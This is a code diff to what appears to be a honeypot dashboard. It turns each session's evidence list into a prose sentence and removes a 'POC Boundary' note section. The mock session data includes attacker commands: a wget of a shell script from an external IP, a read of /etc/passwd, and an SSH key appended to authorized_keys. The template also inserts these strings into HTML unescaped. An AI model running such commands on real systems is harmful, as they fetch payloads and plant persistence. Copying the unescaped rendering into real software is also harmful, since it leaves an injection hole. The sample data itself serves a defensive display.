@@ -99,8 +99,7 @@
         intent: "Credential Access",
         duration: "4m 18s",
         commands: ["whoami", "id", "uname -a", "cat /etc/passwd", "wget http://185.234.219.x/a.sh"],
-        evidence: ["Admin-like username attempts", "Sensitive file read", "External payload fetch attempt"],
-        note: "Single-session report keeps raw behavior here; cross-session weakness trends belong on Intelligence."
+        evidence: "The session showed admin-like username attempts, a read of a sensitive file, and an attempted external payload fetch."
       },
       {
         id: "sess-1047",
@@ -113,8 +112,7 @@
         intent: "Reconnaissance",
         duration: "1m 42s",
         commands: ["pwd", "ls -la", "cat /etc/issue", "netstat -tulpn"],
-        evidence: ["System fingerprinting", "Network service discovery"],
-        note: "This session shows discovery behavior without confirmed payload staging."
+        evidence: "The session performed system fingerprinting followed by network service discovery, consistent with reconnaissance behavior."
       },
       {
         id: "sess-1046",
@@ -127,8 +125,7 @@
         intent: "Scanner Validation",
         duration: "24s",
         commands: ["echo test", "exit"],
-        evidence: ["Short command sequence", "Clean logout"],
-        note: "Likely automated validation with no meaningful post-login activity."
+        evidence: "The session ran a short command sequence and logged out cleanly, consistent with automated scanner validation."
       },
       {
         id: "sess-1045",
@@ -141,8 +138,7 @@
         intent: "Persistence Setup",
         duration: "6m 03s",
         commands: ["whoami", "crontab -l", "mkdir -p ~/.ssh", "echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys"],
-        evidence: ["Persistence path touched", "SSH key insertion attempt"],
-        note: "The report should preserve evidence for this session, while Intelligence later turns repeated patterns into fixes."
+        evidence: "The session touched a persistence path and attempted to insert an SSH key into authorized_keys."
       }
     ];
 
@@ -218,19 +214,13 @@
             <div class="session-detail">
               <section class="detail-block" aria-label="Session evidence">
                 <h3>Evidence</h3>
-                <ul class="detail-list">
-                  ${session.evidence.map((item) => `<li>${item}</li>`).join("")}
-                </ul>
+                <p>${session.evidence}</p>
               </section>
               <section class="detail-block" aria-label="Command timeline">
                 <h3>Command Timeline</h3>
                 <ul class="command-list">
                   ${session.commands.map((command) => `<li>${command}</li>`).join("")}
                 </ul>
-              </section>
-              <section class="detail-block" aria-label="Session note">
-                <h3>POC Boundary</h3>
-                <p>${session.note}</p>
               </section>
             </div>
           </td>
